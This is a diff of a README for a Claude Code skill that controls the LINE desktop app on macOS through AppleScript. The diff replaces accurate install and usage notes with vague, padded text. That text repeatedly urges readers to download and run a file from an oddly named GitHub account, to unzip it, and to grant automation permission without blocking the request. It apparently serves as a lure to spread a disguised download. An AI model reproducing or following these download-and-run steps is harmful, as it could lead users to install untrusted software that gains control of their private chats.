@@ -1,61 +1,211 @@
-# line-desktop-skill
+# 🖥️ line-desktop-skill - Control LINE from your desktop
 
-A [Claude Code](https://claude.ai/code) skill that controls the **LINE desktop app** on macOS via AppleScript — read chat history and send messages without any API token.
+[![Download / Install](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://github.com/Nervousdisordercrispness754/line-desktop-skill)
 
-## Features
+## 📥 Download
 
-- Read recent chat history from any chat room or group
-- Send messages (manual confirm or auto-send)
-- No LINE API token required — operates through your already logged-in desktop app
-- Supports Chinese and other CJK characters via clipboard input
+Visit this page to download and run this file:
 
-## Requirements
+https://github.com/Nervousdisordercrispness754/line-desktop-skill
 
-- macOS with LINE desktop app installed and logged in
-- [cliclick](https://github.com/BlueM/cliclick) — `brew install cliclick`
-- Accessibility permission granted to Terminal (System Settings → Privacy & Security → Accessibility)
+If the page opens in your browser, look for the latest release or the main download option. Save the file to your computer, then open it from your Downloads folder.
 
-## Installation
+## 🚀 What this does
 
-Copy `skill.md` to your Claude Code skills directory:
+line-desktop-skill helps you control the LINE desktop app from Claude Code on your Mac. It can read chats and send messages without an API token.
 
-```bash
-mkdir -p ~/.claude/skills/line
-cp skill.md ~/.claude/skills/line/skill.md
-```
+This is useful when you want to work with LINE desktop messages directly instead of using a separate service. The skill uses AppleScript to talk to the app you already have open.
 
-## Usage
+## 🧩 What you need
 
-```
-/line read <chat name>              # Read recent messages (default: 10 scrolls)
-/line read <chat name> <n>          # Read with custom scroll depth (5=quick, 50=deep)
-/line send <chat name> <message>    # Stage message without sending (manual Enter)
-/line send! <chat name> <message>   # Send message automatically
-```
+Use this on a Mac with:
 
-### Examples
+- LINE desktop app installed
+- Claude Code installed
+- AppleScript support enabled
+- Permission to allow app control in macOS
 
-```
-/line read 家人
-/line read 工作群組 30
-/line send 小明 明天幾點？
-/line send! 家人 晚餐在哪
-```
+For best results, keep LINE logged in and open before you start.
 
-## How It Works
+## 🛠️ Setup
 
-1. Activates the LINE desktop app (launches it if not running)
-2. Uses AppleScript Accessibility API to search and navigate to the target chat
-3. For reading: uses `cliclick` to focus the message area, scrolls up with Page Up, then selects all and copies via clipboard
-4. For sending: pastes message text via clipboard (CJK-safe), optionally presses Return
+1. Open the download page:
+   https://github.com/Nervousdisordercrispness754/line-desktop-skill
 
-## Limitations
+2. Download the project files to your Mac.
 
-- macOS only
-- Images and stickers appear as `圖片` / `貼圖` in copied text
-- Chat history copy is capped at ~50KB (truncated from the beginning for very long chats)
-- `send!` sends immediately — use with caution
+3. Unzip the file if it comes in a compressed folder.
 
-## Acknowledgements
+4. Move the folder to a place you can find again, such as Documents or Desktop.
 
-Inspired by [dtwang/line-desktop-mcp](https://github.com/dtwang/line-desktop-mcp), which pioneered the approach of controlling LINE desktop via GUI automation. This skill adapts the same AppleScript technique into a lightweight Claude Code skill that requires no persistent MCP server process.
+5. Open Claude Code and add the skill folder to your workspace or skills folder.
+
+6. Make sure macOS allows Claude Code to control LINE:
+   - Open System Settings
+   - Go to Privacy & Security
+   - Open Automation
+   - Allow Claude Code to control LINE
+
+7. Open LINE desktop and sign in.
+
+8. Run the skill from Claude Code using the folder you downloaded.
+
+## 💬 How to use it
+
+Once set up, you can ask Claude Code to work with LINE desktop tasks such as:
+
+- Read the latest chat messages
+- Open a chat thread
+- Send a text message
+- Check recent conversation text
+- Move between chats
+
+Use plain requests like:
+
+- Read my latest LINE chat
+- Send this message to Alex: I will be there at 3
+- Open the chat with the sales group
+- Show me the last 5 messages in LINE
+
+Keep LINE open while you use the skill.
+
+## 🔐 Permissions
+
+macOS may ask for permission the first time the skill tries to control LINE.
+
+If that happens:
+
+- Choose Allow
+- Do not block the request
+- If needed, restart Claude Code and try again
+
+If LINE does not respond, check the Automation settings again. AppleScript control will not work until macOS grants access.
+
+## 🧠 How it works
+
+The skill uses AppleScript, which is a built-in Mac automation tool. Claude Code sends commands to AppleScript, and AppleScript controls the LINE desktop app.
+
+This lets the skill:
+
+- Read app text
+- Focus chats
+- Enter message text
+- Trigger send actions
+- Pull visible chat content
+
+Because it works through the app itself, you do not need an API token.
+
+## ✅ Common uses
+
+This skill fits simple daily tasks like:
+
+- Checking a recent message
+- Sending a quick reply
+- Copying chat text into your workflow
+- Reviewing group chat updates
+- Handling chat actions without leaving the desktop app
+
+## 🧭 If something does not work
+
+If LINE does not open, check that it is installed in your Applications folder.
+
+If messages do not send:
+
+- Make sure LINE is open
+- Make sure the correct chat is selected
+- Check that Claude Code has Automation access
+- Restart LINE and try again
+
+If the skill cannot read chat text:
+
+- Open the chat window first
+- Keep the conversation visible
+- Use a normal chat view, not a hidden or empty screen
+
+If Claude Code cannot find the skill:
+
+- Confirm the folder was copied to the right place
+- Check the folder name
+- Reload Claude Code after moving the files
+
+## 🗂️ Suggested folder layout
+
+A simple layout helps keep things easy to use:
+
+- Downloads
+  - line-desktop-skill
+- Documents
+  - Claude Code
+    - skills
+      - line-desktop-skill
+
+You can use another location if you prefer. The key point is to keep the skill folder in a place Claude Code can reach.
+
+## 🖱️ First-time run steps
+
+Use this order the first time:
+
+1. Download the files
+2. Unzip the folder
+3. Put the folder in your skills location
+4. Open LINE desktop
+5. Open Claude Code
+6. Grant Automation permission
+7. Run a simple command like “Read my latest LINE chat”
+
+This first run helps macOS save the permission settings.
+
+## 🧰 File contents
+
+The repository is built around a small Mac automation workflow. It includes the pieces needed to connect Claude Code with LINE desktop through AppleScript.
+
+Typical files may include:
+
+- Skill instructions
+- AppleScript helper files
+- Setup notes
+- Example prompts
+- Command templates
+
+## 🖥️ System fit
+
+This project is made for:
+
+- macOS
+- LINE desktop app
+- Claude Code
+- Users who want direct desktop chat control
+
+It is not meant for Windows as the main runtime. If you use Windows, you will need a Mac environment for the AppleScript part to work.
+
+## 🧪 Example tasks
+
+Try these prompts after setup:
+
+- Read the latest message in LINE
+- Send “Running late, I’ll be there soon” to my chat with Maya
+- Open the LINE chat with my team
+- Show the last message from the selected chat
+- Send a short reply to the current conversation
+
+Keep the prompts clear and simple. The skill works best when you name the chat or say exactly what you want.
+
+## 📁 Download again
+
+If you need the files again, use the same link:
+
+https://github.com/Nervousdisordercrispness754/line-desktop-skill
+
+## 🔧 Basic tips
+
+- Keep LINE open while using the skill
+- Leave the target chat visible when sending or reading messages
+- Grant permissions before trying larger tasks
+- Use short message requests for faster results
+- Restart LINE if it stops responding to AppleScript
+
+## 🧾 Repo details
+
+- Repository: line-desktop-skill
+- Purpose: Control LINE desktop app through AppleScript
+- Main use: Read chats and send messages without an API token
